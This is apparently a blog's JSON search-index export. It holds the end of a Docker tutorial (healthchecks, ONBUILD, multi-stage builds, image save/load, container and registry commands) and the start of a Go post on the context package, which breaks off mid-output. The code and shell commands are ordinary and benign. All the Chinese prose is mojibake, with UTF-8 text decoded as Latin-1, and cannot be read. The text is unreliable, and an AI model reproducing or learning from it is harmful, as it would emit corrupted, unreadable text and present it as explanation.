`--retries=<æ¬¡æ•°>`ï¼šå½“è¿ç»­å¤±è´¥æŒ‡å®šæ¬¡æ•°åï¼Œåˆ™å°†å®¹å™¨çŠ¶æ€è§†ä¸º `unhealthy`ï¼Œé»˜è®¤ 3 æ¬¡ã€‚\n\n**å’Œ `CMD`, `ENTRYPOINT` ä¸€æ ·ï¼Œ`HEALTHCHECK` åªå¯ä»¥å‡ºç°ä¸€æ¬¡ï¼Œå¦‚æœå†™äº†å¤šä¸ªï¼Œåªæœ‰æœ€åä¸€ä¸ªç”Ÿæ•ˆã€‚**\n\n \n\nå‡è®¾æˆ‘ä»¬æœ‰ä¸ªé•œåƒæ˜¯ä¸ªæœ€ç®€å•çš„ Web æœåŠ¡ï¼Œæˆ‘ä»¬å¸Œæœ›å¢åŠ å¥åº·æ£€æŸ¥æ¥åˆ¤æ–­å…¶ Web æœåŠ¡æ˜¯å¦åœ¨æ­£å¸¸å·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ `curl` æ¥å¸®åŠ©åˆ¤æ–­ï¼Œå…¶ `Dockerfile` çš„ `HEALTHCHECK` å¯ä»¥è¿™ä¹ˆå†™ï¼š\n\n```\nFROM nginx\nRUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*\nHEALTHCHECK --interval=5s --timeout=3s \\\n  CMD curl -fs http://localhost/ || exit 1\n```\n\n \n\n+ ONBUILD ä¸ºä»–äººåšå«è¡£è£³\n\næ ¼å¼ï¼š`ONBUILD <å…¶å®ƒæŒ‡ä»¤>`ã€‚\n\n`ONBUILD` æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æŒ‡ä»¤ï¼Œå®ƒåé¢è·Ÿçš„æ˜¯å…¶å®ƒæŒ‡ä»¤ï¼Œæ¯”å¦‚ `RUN`, `COPY` ç­‰ï¼Œè€Œè¿™äº›æŒ‡ä»¤ï¼Œåœ¨å½“å‰é•œåƒæ„å»ºæ—¶å¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚åªæœ‰å½“ä»¥å½“å‰é•œåƒä¸ºåŸºç¡€é•œåƒï¼Œå»æ„å»ºä¸‹ä¸€çº§é•œåƒçš„æ—¶å€™æ‰ä¼šè¢«æ‰§è¡Œã€‚\n\n`Dockerfile` ä¸­çš„å…¶å®ƒæŒ‡ä»¤éƒ½æ˜¯ä¸ºäº†å®šåˆ¶å½“å‰é•œåƒè€Œå‡†å¤‡çš„ï¼Œå”¯æœ‰ `ONBUILD` æ˜¯ä¸ºäº†å¸®åŠ©åˆ«äººå®šåˆ¶è‡ªå·±è€Œå‡†å¤‡çš„ã€‚\n\n \n\n### 3.4 dockerå¤šé˜¶æ®µæ„å»º (å¤šä¸ª FROM as)\n\næˆ‘ä»¬æ„å»º Docker é•œåƒæ—¶ï¼Œä¸€ç§æ–¹å¼æ˜¯å°†æ‰€æœ‰çš„æ„å»ºè¿‡ç¨‹ç¼–åŒ…å«åœ¨ä¸€ä¸ª `Dockerfile` ä¸­ï¼ŒåŒ…æ‹¬é¡¹ç›®åŠå…¶ä¾èµ–åº“çš„ç¼–è¯‘ã€æµ‹è¯•ã€æ‰“åŒ…ç­‰æµç¨‹ï¼Œè¿™é‡Œå¯èƒ½ä¼šå¸¦æ¥çš„ä¸€äº›é—®é¢˜ï¼š\n\n- `Dockerfile` ç‰¹åˆ«é•¿ï¼Œå¯ç»´æŠ¤æ€§é™ä½\n\n- é•œåƒå±‚æ¬¡å¤šï¼Œé•œåƒä½“ç§¯è¾ƒå¤§ï¼Œéƒ¨ç½²æ—¶é—´å˜é•¿\n\n- æºä»£ç å­˜åœ¨æ³„éœ²çš„é£é™©\n\n  \n\nDocker v17.05 å¼€å§‹æ”¯æŒå¤šé˜¶æ®µæ„å»º (`multistage builds`)ã€‚\n\nç¼–å†™ `Dockerfile` æ–‡ä»¶\n\n```\nFROM golang:1.9-alpine as builder\n\nRUN apk --no-cache add git\n\nWORKDIR /go/src/github.com/go/helloworld/\n\nRUN go get -d -v github.com/go-sql-driver/mysql\n\nCOPY app.go .\n\nRUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .\n\nFROM alpine:latest as prod\n\nRUN apk --no-cache add ca-certificates\n\nWORKDIR /root/\n\nCOPY --from=0 /go/src/github.com/go/helloworld/app .\n\nCMD [\"./app\"]\n```\n\næ„å»ºé•œåƒ\n\n```\n$ docker build -t go/helloworld:3 .\n```\n\n\n\n+ åªæ„å»ºæŸä¸€é˜¶æ®µçš„é•œåƒ\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `as` æ¥ä¸ºæŸä¸€é˜¶æ®µå‘½åï¼Œä¾‹å¦‚\n\n```\nFROM golang:1.9-alpine as builder\n```\n\nä¾‹å¦‚å½“æˆ‘ä»¬åªæƒ³æ„å»º `builder` é˜¶æ®µçš„é•œåƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨ `docker build` å‘½ä»¤æ—¶åŠ ä¸Š `--target`å‚æ•°å³å¯\n\n```\n$ docker build --target builder -t username/imagename:tag .\n```\n\n\n\n+ æ„å»ºæ—¶ä»å…¶ä»–é•œåƒå¤åˆ¶æ–‡ä»¶\n\nä¸Šé¢ä¾‹å­ä¸­æˆ‘ä»¬ä½¿ç”¨ `COPY --from=0 /go/src/github.com/go/helloworld/app .` ä»ä¸Šä¸€é˜¶æ®µçš„é•œåƒä¸­å¤åˆ¶æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¤åˆ¶ä»»æ„é•œåƒä¸­çš„æ–‡ä»¶ã€‚\n\n```\n$ COPY --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf\n```\n\n\n\n### 3.5 å…¶å®ƒåˆ¶ä½œé•œåƒçš„æ–¹å¼\n\n\n\n+  `docker save` å’Œ `docker load`\n\nDocker è¿˜æä¾›äº†Â `docker load`Â å’ŒÂ `docker save`Â å‘½ä»¤ï¼Œç”¨ä»¥å°†é•œåƒä¿å­˜ä¸ºä¸€ä¸ªÂ `tar`Â æ–‡ä»¶ï¼Œç„¶åä¼ è¾“åˆ°å¦ä¸€ä¸ªä½ç½®ä¸Šï¼Œå†åŠ è½½è¿›æ¥ã€‚è¿™æ˜¯åœ¨æ²¡æœ‰ Docker Registry æ—¶çš„åšæ³•ï¼Œç°åœ¨å·²ç»ä¸æ¨èï¼Œé•œåƒè¿ç§»åº”è¯¥ç›´æ¥ä½¿ç”¨ Docker Registryï¼Œæ— è®ºæ˜¯ç›´æ¥ä½¿ç”¨ Docker Hub è¿˜æ˜¯ä½¿ç”¨å†…ç½‘ç§æœ‰ Registry éƒ½å¯ä»¥ã€‚\n\n\n\n+ ä¿å­˜é•œåƒ\n\nä½¿ç”¨ `docker save` å‘½ä»¤å¯ä»¥å°†é•œåƒä¿å­˜ä¸ºå½’æ¡£æ–‡ä»¶ã€‚\n\næ¯”å¦‚æˆ‘ä»¬å¸Œæœ›ä¿å­˜è¿™ä¸ª `alpine` é•œåƒã€‚\n\n```\n$ docker image ls alpine\nREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE\nalpine              latest              baa5d63471ea        5 weeks ago         4.803 MB\n```\n\nä¿å­˜é•œåƒçš„å‘½ä»¤ä¸ºï¼š\n\n```\n$ docker save alpine | gzip > alpine-latest.tar.gz\n```\n\nç„¶åæˆ‘ä»¬å°† `alpine-latest.tar.gz` æ–‡ä»¶å¤åˆ¶åˆ°äº†åˆ°äº†å¦ä¸€ä¸ªæœºå™¨ä¸Šï¼Œå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªå‘½ä»¤åŠ è½½é•œåƒï¼š\n\n```\n$ docker load -i alpine-latest.tar.gz\nLoaded image: alpine:latest\n```\n\n \n\nå¦‚æœæˆ‘ä»¬ç»“åˆè¿™ä¸¤ä¸ªå‘½ä»¤ä»¥åŠ `ssh` ç”šè‡³ `pv` çš„è¯ï¼Œåˆ©ç”¨ Linux å¼ºå¤§çš„ç®¡é“ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªå‘½ä»¤å®Œæˆä»ä¸€ä¸ªæœºå™¨å°†é•œåƒè¿ç§»åˆ°å¦ä¸€ä¸ªæœºå™¨ï¼Œå¹¶ä¸”å¸¦è¿›åº¦æ¡çš„åŠŸèƒ½ï¼š\n\n```\ndocker save <é•œåƒå> | bzip2 | pv | ssh <ç”¨æˆ·å>@<ä¸»æœºå> 'cat | docker load'\n```\n\n\n\n+ docker export save åŒºåˆ«\n\n- docker saveæ˜¯å°†ä¸€ä¸ªé•œåƒå¯¼å‡ºæˆä¸€ä¸ªtarballæ–‡ä»¶ï¼Œå¯¹åº”çš„å¯¼å…¥å‘½ä»¤æ˜¯docker loadï¼Œå°†è¯¥æ–‡ä»¶å¯¼å…¥æˆä¸€ä¸ªé•œåƒã€‚ \n- docker exportæ˜¯å°†ä¸€ä¸ªå®¹å™¨å¯¼å‡ºæˆä¸€ä¸ªtarballæ–‡ä»¶ï¼Œå¯¹åº”çš„å¯¼å…¥å‘½ä»¤æ—¶docker importï¼Œå°†è¯¥æ–‡ä»¶å¯¼å…¥æˆä¸€ä¸ªé•œåƒï¼ˆæ³¨æ„ä¸æ˜¯å®¹å™¨ï¼‰ã€‚  å®¹å™¨å¿«ç…§å°†ä¼šä¸¢å¼ƒæ‰€æœ‰çš„å†å²è®°å½•å’Œå…ƒæ•°æ®ä¿¡æ¯\n\n\n\n# 4. æ“ä½œå®¹å™¨\n\n### 4.1 æ–°å»ºå¹¶å¯åŠ¨ \n\næ‰€éœ€è¦çš„å‘½ä»¤ä¸»è¦ä¸ºÂ `docker run`ã€‚\n\n```\n$ docker run -t -i ubuntu:14.04 /bin/bash\nroot@af8bae53bdd3:/#\n```\n\nå…¶ä¸­ï¼Œ`-t`Â é€‰é¡¹è®©Dockeråˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ï¼ˆpseudo-ttyï¼‰å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¸Šï¼ŒÂ `-i`Â åˆ™è®©å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¿æŒæ‰“å¼€ã€‚\n\n\n\nå½“åˆ©ç”¨ `docker run` æ¥åˆ›å»ºå®¹å™¨æ—¶ï¼ŒDocker åœ¨åå°è¿è¡Œçš„æ ‡å‡†æ“ä½œåŒ…æ‹¬ï¼š\n\n- æ£€æŸ¥æœ¬åœ°æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é•œåƒï¼Œä¸å­˜åœ¨å°±ä»å…¬æœ‰ä»“åº“ä¸‹è½½\n- åˆ©ç”¨é•œåƒåˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå®¹å™¨\n- åˆ†é…ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶åœ¨åªè¯»çš„é•œåƒå±‚å¤–é¢æŒ‚è½½ä¸€å±‚å¯è¯»å†™å±‚\n- ä»å®¿ä¸»ä¸»æœºé…ç½®çš„ç½‘æ¡¥æ¥å£ä¸­æ¡¥æ¥ä¸€ä¸ªè™šæ‹Ÿæ¥å£åˆ°å®¹å™¨ä¸­å»\n- ä»åœ°å€æ± é…ç½®ä¸€ä¸ª ip åœ°å€ç»™å®¹å™¨\n- æ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„åº”ç”¨ç¨‹åº\n- æ‰§è¡Œå®Œæ¯•åå®¹å™¨è¢«ç»ˆæ­¢\n\n\n\n### 4.2 å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨\n\nå¯ä»¥åˆ©ç”¨Â `docker container start`Â å‘½ä»¤ï¼Œç›´æ¥å°†ä¸€ä¸ªå·²ç»ç»ˆæ­¢çš„å®¹å™¨å¯åŠ¨è¿è¡Œã€‚\n\n\n\n### 4.3 åå°è¿è¡Œ\n\næ›´å¤šçš„æ—¶å€™ï¼Œéœ€è¦è®© Docker åœ¨åå°è¿è¡Œè€Œä¸æ˜¯ç›´æ¥æŠŠæ‰§è¡Œå‘½ä»¤çš„ç»“æœè¾“å‡ºåœ¨å½“å‰å®¿ä¸»æœºä¸‹ã€‚æ­¤æ—¶ï¼Œå¯ä»¥é€šè¿‡æ·»åŠ Â `-d`Â å‚æ•°æ¥å®ç°ã€‚\n\n```\n docker run -d ubuntu:17.10 /bin/sh -c \"while true; do echo hello world; sleep 1; done\"\n77b2dc01fe0f3f1265df143181e7b9af5e05279a884f4776ee75350ea9d8017a\n```\n\næ­¤æ—¶å®¹å™¨ä¼šåœ¨åå°è¿è¡Œå¹¶ä¸ä¼šæŠŠè¾“å‡ºçš„ç»“æœ (STDOUT) æ‰“å°åˆ°å®¿ä¸»æœºä¸Šé¢(è¾“å‡ºç»“æœå¯ä»¥ç”¨Â `docker logs`æŸ¥çœ‹)ã€‚\n\n\n\nè¦è·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡Â `docker container logs`Â å‘½ä»¤ã€‚\n\n```\ndocker container logs [container ID or NAMES]\nhello world\nhello world\nhello world\n. . .\n```\n\n\n\n### 4.4 ç»ˆæ­¢å®¹å™¨\n\nå¯ä»¥ä½¿ç”¨ `docker container stop` æ¥ç»ˆæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ã€‚\n\n \n\n### 4.5 è¿›å…¥å®¹å™¨\n\n`docker exec` åè¾¹å¯ä»¥è·Ÿå¤šä¸ªå‚æ•°ï¼Œè¿™é‡Œä¸»è¦è¯´æ˜ `-i` `-t` å‚æ•°ã€‚\n\nåªç”¨ `-i` å‚æ•°æ—¶ï¼Œç”±äºæ²¡æœ‰åˆ†é…ä¼ªç»ˆç«¯ï¼Œç•Œé¢æ²¡æœ‰æˆ‘ä»¬ç†Ÿæ‚‰çš„ Linux å‘½ä»¤æç¤ºç¬¦ï¼Œä½†å‘½ä»¤æ‰§è¡Œç»“æœä»ç„¶å¯ä»¥è¿”å›ã€‚\n\nå½“ `-i` `-t` å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œåˆ™å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç†Ÿæ‚‰çš„ Linux å‘½ä»¤æç¤ºç¬¦ã€‚\n\n\n\n```\ndocker exec -it 69d1 bash\nroot@69d137adef7a:/#\n```\n\n\n\n### 4.6 å¯¼å‡ºå®¹å™¨\n\nå¦‚æœè¦å¯¼å‡ºæœ¬åœ°æŸä¸ªå®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨Â `docker export`Â å‘½ä»¤ã€‚\n\n```\ndocker export 7691a814370e > ubuntu.tar\n```\n\nè¿™æ ·å°†å¯¼å‡ºå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°æ–‡ä»¶ã€‚\n\n\n\n### 4.7 å¯¼å…¥å®¹å™¨å¿«ç…§\n\n```\n$ cat ubuntu.tar | docker import - test/ubuntu:v1.0\n$ docker image ls\nREPOSITORY          TAG                 IMAGE ID            CREATED              VIRTUAL SIZE\ntest/ubuntu         v1.0                9d37a6082e97        About a minute ago   171.3 MB\n```\n\n\n\næ­¤å¤–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŒ‡å®š URL æˆ–è€…æŸä¸ªç›®å½•æ¥å¯¼å…¥ï¼Œä¾‹å¦‚\n\n```\n$ docker import http://example.com/exampleimage.tgz example/imagerepo\n```\n\n\n\næ³¨ï¼šç”¨æˆ·æ—¢å¯ä»¥ä½¿ç”¨Â docker loadÂ æ¥å¯¼å…¥é•œåƒå­˜å‚¨æ–‡ä»¶åˆ°æœ¬åœ°é•œåƒåº“ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨Â docker importÂ æ¥å¯¼å…¥ä¸€ä¸ªå®¹å™¨å¿«ç…§åˆ°æœ¬åœ°é•œåƒåº“ã€‚è¿™ä¸¤è€…çš„åŒºåˆ«åœ¨äºå®¹å™¨å¿«ç…§æ–‡ä»¶å°†ä¸¢å¼ƒæ‰€æœ‰çš„å†å²è®°å½•å’Œå…ƒæ•°æ®ä¿¡æ¯ï¼ˆå³ä»…ä¿å­˜å®¹å™¨å½“æ—¶çš„å¿«ç…§çŠ¶æ€ï¼‰ï¼Œè€Œé•œåƒå­˜å‚¨æ–‡ä»¶å°†ä¿å­˜å®Œæ•´è®°å½•ï¼Œä½“ç§¯ä¹Ÿè¦å¤§ã€‚æ­¤å¤–ï¼Œä»å®¹å™¨å¿«ç…§æ–‡ä»¶å¯¼å…¥æ—¶å¯ä»¥é‡æ–°æŒ‡å®šæ ‡ç­¾ç­‰å…ƒæ•°æ®ä¿¡æ¯ã€‚ \n\n\n\n### 4.8 åˆ é™¤å®¹å™¨\n\nå¯ä»¥ä½¿ç”¨Â `docker container rm`Â æ¥åˆ é™¤ä¸€ä¸ªå¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ä¾‹å¦‚\n\n```\n$ docker container rm  trusting_newton\ntrusting_newton\n```\n\n\n\n### 4.9 æ¸…ç†æ‰€æœ‰å¤„äºç»ˆæ­¢çŠ¶æ€çš„å®¹å™¨\n\n```\n$ docker container prune\n```\n\n\n\n# 5. è®¿é—®ä»“åº“\n\n### 5.1 Docker Hub\n\nä½ å¯ä»¥åœ¨Â [https://cloud.docker.com](https://cloud.docker.com/)Â å…è´¹æ³¨å†Œä¸€ä¸ª Docker è´¦å·ã€‚\n\nå¯ä»¥é€šè¿‡æ‰§è¡Œ `docker login` å‘½ä»¤äº¤äº’å¼çš„è¾“å…¥ç”¨æˆ·ååŠå¯†ç æ¥å®Œæˆåœ¨å‘½ä»¤è¡Œç•Œé¢ç™»å½• Docker Hubã€‚\n\nä½ å¯ä»¥é€šè¿‡ `docker logout` é€€å‡ºç™»å½•ã€‚\n\n\n\n### 5.2 æ‹‰å–é•œåƒ\n\nä½ å¯ä»¥é€šè¿‡Â `docker search`Â å‘½ä»¤æ¥æŸ¥æ‰¾å®˜æ–¹ä»“åº“ä¸­çš„é•œåƒï¼Œå¹¶åˆ©ç”¨Â `docker pull`Â å‘½ä»¤æ¥å°†å®ƒä¸‹è½½åˆ°æœ¬åœ°ã€‚\n\n\n\nä¸€ç§æ˜¯ç±»ä¼¼Â `centos`Â è¿™æ ·çš„é•œåƒï¼Œè¢«ç§°ä¸ºåŸºç¡€é•œåƒæˆ–æ ¹é•œåƒã€‚è¿™äº›åŸºç¡€é•œåƒç”± Docker å…¬å¸åˆ›å»ºã€éªŒè¯ã€æ”¯æŒã€æä¾›ã€‚è¿™æ ·çš„é•œåƒå¾€å¾€ä½¿ç”¨å•ä¸ªå•è¯ä½œä¸ºåå­—ã€‚\n\nè¿˜æœ‰ä¸€ç§ç±»å‹ï¼Œæ¯”å¦‚Â `tianon/centos`Â é•œåƒï¼Œå®ƒæ˜¯ç”± Docker çš„ç”¨æˆ·åˆ›å»ºå¹¶ç»´æŠ¤çš„ï¼Œå¾€å¾€å¸¦æœ‰ç”¨æˆ·åç§°å‰ç¼€ã€‚å¯ä»¥é€šè¿‡å‰ç¼€Â `username/`Â æ¥æŒ‡å®šä½¿ç”¨æŸä¸ªç”¨æˆ·æä¾›çš„é•œåƒï¼Œæ¯”å¦‚ tianon ç”¨æˆ·ã€‚\n\n\n\n### 5.3 æ¨é€é•œåƒ\n\nç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨ç™»å½•åé€šè¿‡ `docker push` å‘½ä»¤æ¥å°†è‡ªå·±çš„é•œåƒæ¨é€åˆ° Docker Hubã€‚\n\n```\n$ docker tag ubuntu:17.10 username/ubuntu:17.10\n\n$ docker image ls\n\nREPOSITORY                                               TAG                    IMAGE ID            CREATED             SIZE\nubuntu                                                   17.10                  275d79972a86        6 days ago          94.6MB\nusername/ubuntu                                          17.10                  275d79972a86        6 days ago          94.6MB\n\n$ docker push username/ubuntu:17.10\n\n$ docker search username\n\nNAME                      DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED\nusername/ubuntu\n```\n\n\n\n### 5.4 è‡ªåŠ¨åˆ›å»º\n\næœ‰æ—¶å€™ï¼Œç”¨æˆ·åˆ›å»ºäº†é•œåƒï¼Œå®‰è£…äº†æŸä¸ªè½¯ä»¶ï¼Œå¦‚æœè½¯ä»¶å‘å¸ƒæ–°ç‰ˆæœ¬åˆ™éœ€è¦æ‰‹åŠ¨æ›´æ–°é•œåƒã€‚\n\nè€Œè‡ªåŠ¨åˆ›å»ºå…è®¸ç”¨æˆ·é€šè¿‡ Docker Hub æŒ‡å®šè·Ÿè¸ªä¸€ä¸ªç›®æ ‡ç½‘ç«™ï¼ˆç›®å‰æ”¯æŒ [GitHub](https://github.com/) æˆ– [BitBucket](https://bitbucket.org/)ï¼‰ä¸Šçš„é¡¹ç›®ï¼Œä¸€æ—¦é¡¹ç›®å‘ç”Ÿæ–°çš„æäº¤æˆ–è€…åˆ›å»ºæ–°çš„æ ‡ç­¾ï¼ˆtagï¼‰ï¼ŒDocker Hub ä¼šè‡ªåŠ¨æ„å»ºé•œåƒå¹¶æ¨é€åˆ° Docker Hub ä¸­ã€‚\n\n \n\nè¦é…ç½®è‡ªåŠ¨åˆ›å»ºï¼ŒåŒ…æ‹¬å¦‚ä¸‹çš„æ­¥éª¤ï¼š\n\n- åˆ›å»ºå¹¶ç™»å½• Docker Hubï¼Œä»¥åŠç›®æ ‡ç½‘ç«™ï¼›\n- åœ¨ç›®æ ‡ç½‘ç«™ä¸­è¿æ¥å¸æˆ·åˆ° Docker Hubï¼›\n- åœ¨ Docker Hub ä¸­ [é…ç½®ä¸€ä¸ªè‡ªåŠ¨åˆ›å»º](https://registry.hub.docker.com/builds/add/)ï¼›\n- é€‰å–ä¸€ä¸ªç›®æ ‡ç½‘ç«™ä¸­çš„é¡¹ç›®ï¼ˆéœ€è¦å« `Dockerfile`ï¼‰å’Œåˆ†æ”¯ï¼›\n- æŒ‡å®š `Dockerfile` çš„ä½ç½®ï¼Œå¹¶æäº¤åˆ›å»ºã€‚\n\nä¹‹åï¼Œå¯ä»¥åœ¨ Docker Hub çš„ [è‡ªåŠ¨åˆ›å»ºé¡µé¢](https://registry.hub.docker.com/builds/) ä¸­è·Ÿè¸ªæ¯æ¬¡åˆ›å»ºçš„çŠ¶æ€ã€‚\n\n\n\n### 5.5 ç§æœ‰ä»“åº“\n\n[`docker-registry`](https://docs.docker.com/registry/)Â æ˜¯å®˜æ–¹æä¾›çš„å·¥å…·ï¼Œå¯ä»¥ç”¨äºæ„å»ºç§æœ‰çš„é•œåƒä»“åº“ã€‚\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ dockeråŸºç¡€å…¥é—¨æ•™ç¨‹ï¼ˆäºŒï¼‰https://www.liuvv.com/p/cc94e38a.html","tags":["docker"],"categories":["docker"]},{"title":"golangçš„contextåŒ…ä½¿ç”¨åœºæ™¯","url":"%2Fp%2F63c8f369.html","content":"\n\n# 1. ä»‹ç»\nä¸€ä¸ªç½‘ç»œè¯·æ±‚Requestï¼Œæ¯ä¸ªRequestéƒ½éœ€è¦å¼€å¯ä¸€ä¸ªgoroutineåšä¸€äº›äº‹æƒ…ï¼Œè¿™äº›goroutineåˆå¯èƒ½ä¼šå¼€å¯å…¶ä»–çš„goroutineã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ç§å¯ä»¥è·Ÿè¸ªgoroutineçš„æ–¹æ¡ˆï¼Œæ‰å¯ä»¥è¾¾åˆ°æ§åˆ¶ä»–ä»¬çš„ç›®çš„ï¼Œè¿™å°±æ˜¯Goè¯­è¨€ä¸ºæˆ‘ä»¬æä¾›çš„Contextï¼Œç§°ä¹‹ä¸ºä¸Šä¸‹æ–‡éå¸¸è´´åˆ‡ï¼Œå®ƒå°±æ˜¯goroutineçš„ä¸Šä¸‹æ–‡ã€‚\n\n<!-- more -->\n\n### 1.1 Context æ¥å£\n\n```go\ntype Context interface {\n\tDeadline() (deadline time.Time, ok bool)\n\tDone() <-chan struct{}\n\tErr() error\n\tValue(key interface{}) interface{}\n}\n```\n\n\n* Deadlineæ–¹æ³•æ˜¯è·å–è®¾ç½®çš„æˆªæ­¢æ—¶é—´çš„æ„æ€ï¼Œç¬¬ä¸€ä¸ªè¿”å›å¼æ˜¯æˆªæ­¢æ—¶é—´ï¼Œåˆ°äº†è¿™ä¸ªæ—¶é—´ç‚¹ï¼ŒContextä¼šè‡ªåŠ¨å‘èµ·å–æ¶ˆè¯·æ±‚ï¼›ç¬¬äºŒä¸ªè¿”å›å€¼ok==falseæ—¶è¡¨ç¤ºæ²¡æœ‰è®¾ç½®æˆªæ­¢æ—¶é—´ï¼Œå¦‚æœéœ€è¦å–æ¶ˆçš„è¯ï¼Œéœ€è¦è°ƒç”¨å–æ¶ˆå‡½æ•°è¿›è¡Œå–æ¶ˆã€‚\n\n* Doneæ–¹æ³•è¿”å›ä¸€ä¸ªåªè¯»çš„chanï¼Œç±»å‹ä¸ºstruct{}ï¼Œæˆ‘ä»¬åœ¨goroutineä¸­ï¼Œå¦‚æœè¯¥æ–¹æ³•è¿”å›çš„chanå¯ä»¥è¯»å–ï¼Œåˆ™æ„å‘³ç€parent contextå·²ç»å‘èµ·äº†å–æ¶ˆè¯·æ±‚ï¼Œæˆ‘ä»¬é€šè¿‡Doneæ–¹æ³•æ”¶åˆ°è¿™ä¸ªä¿¡å·åï¼Œå°±åº”è¯¥åšæ¸…ç†æ“ä½œï¼Œç„¶åé€€å‡ºgoroutineï¼Œé‡Šæ”¾èµ„æºã€‚\n\n* Erræ–¹æ³•è¿”å›å–æ¶ˆçš„é”™è¯¯åŸå› ï¼Œå› ä¸ºä»€ä¹ˆContextè¢«å–æ¶ˆã€‚\n\n* Valueæ–¹æ³•è·å–è¯¥Contextä¸Šç»‘å®šçš„å€¼ï¼Œæ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ‰€ä»¥è¦é€šè¿‡ä¸€ä¸ªKeyæ‰å¯ä»¥è·å–å¯¹åº”çš„å€¼ï¼Œè¿™ä¸ªå€¼ä¸€èˆ¬æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚\n\n### 1.2 Contextçš„ç»§æ‰¿è¡ç”Ÿ\n\n```go\nfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)\nfunc WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)\nfunc WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)\nfunc WithValue(parent Context, key, val interface{}) Context\n```\n\n# 2. ä½¿ç”¨\n\n### 2.1 valueä¼ é€’æ•°æ®\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nvar key string = \"name\"\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tvalueCtx := context.WithValue(ctx, key, \"ç›‘æ§1\")\n\tgo watch(valueCtx)\n\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"å¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\")\n\n\tcancel()\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(ctx.Value(key), \"ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(ctx.Value(key), \"goroutineç›‘æ§ä¸­...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nå¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\nç›‘æ§1 ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\n```\n\n### 2.2 æ§åˆ¶gorotuineé€€å‡º\n\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tgo watch(ctx, \"ç›‘æ§1\")\n\tgo watch(ctx, \"ç›‘æ§2\")\n\tgo watch(ctx, \"ç›‘æ§3\")\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"å¯ä»¥äº†ï¼Œé€šçŸ¥ç›‘æ§åœæ­¢\")\n\tcancel()\n\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context, name string) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(name, \"ç›‘æ§é€€å‡ºï¼Œåœæ­¢äº†...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(name, \"goroutineç›‘æ§ä¸­...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§1 goroutineç›‘æ§ä¸­...\nç›‘æ§2 goroutineç›‘æ§ä¸­...\nç›‘æ§3 goroutineç›‘æ§ä¸­...\nç›‘æ§1 